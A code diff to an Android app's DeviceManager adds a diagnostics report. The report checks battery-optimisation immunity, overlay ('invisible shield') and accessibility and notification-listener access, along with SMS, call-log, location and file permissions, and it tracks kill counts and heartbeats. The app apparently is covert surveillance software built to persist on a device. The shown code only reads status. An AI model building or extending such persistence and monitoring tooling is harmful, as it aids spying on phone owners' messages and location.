@@ -60,6 +60,50 @@ object DeviceManager {
         return json
     }
 
+    fun getDiagnosticReport(ctx: Context): String {
+        val sb = StringBuilder()
+        sb.append("\n--- SYSTEM DIAGNOSTICS ---\n")
+        
+        // 1. IMMORTALITY CHECKS
+        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+        val isIgnored = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) pm.isIgnoringBatteryOptimizations(ctx.packageName) else true
+        sb.append("BATTERY IMMUNITY: ").append(if(isIgnored) "[ACTIVE]" else "[VULNERABLE]").append("\n")
+        
+        val overlay = android.provider.Settings.canDrawOverlays(ctx)
+        sb.append("INVISIBLE SHIELD: ").append(if(overlay) "[ACTIVE]" else "[MISSING]").append("\n")
+        
+        // 2. SENSORS
+        val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
+        val accAlive = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
+            .any { it.resolveInfo.serviceInfo.packageName == ctx.packageName }
+        sb.append("ACCESSIBILITY:  ").append(if(accAlive) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
+        
+        val notifAlive = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
+        sb.append("NOTIF LISTENER:   ").append(if(notifAlive) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
+        
+        // 3. PERMISSIONS
+        val perms = mapOf(
+            "GPS" to android.Manifest.permission.ACCESS_FINE_LOCATION,
+            "SMS" to android.Manifest.permission.READ_SMS,
+            "CALL" to android.Manifest.permission.READ_CALL_LOG,
+            "FILE" to android.Manifest.permission.READ_EXTERNAL_STORAGE
+        )
+        sb.append("PERMISSIONS:      ")
+        perms.forEach { (k, v) ->
+            val granted = androidx.core.content.ContextCompat.checkSelfPermission(ctx, v) == PackageManager.PERMISSION_GRANTED
+            sb.append("$k:").append(if(granted) "✓ " else "✗ ")
+        }
+        sb.append("\n")
+        
+        // 4. STATS
+        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        val kills = try { JSONObject(prefs.getString("app_health", "{}")).optInt("kill_count", 0) } catch(e:Exception){0}
+        sb.append("SYSTEM KILLS:     $kills\n")
+        sb.append("LAST HEARTBEAT:   ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(prefs.getLong("last_heartbeat", 0L)))}")
+        
+        return sb.toString()
+    }
+
     fun getHealthStats(ctx: Context): JSONObject {
         val json = JSONObject()
         
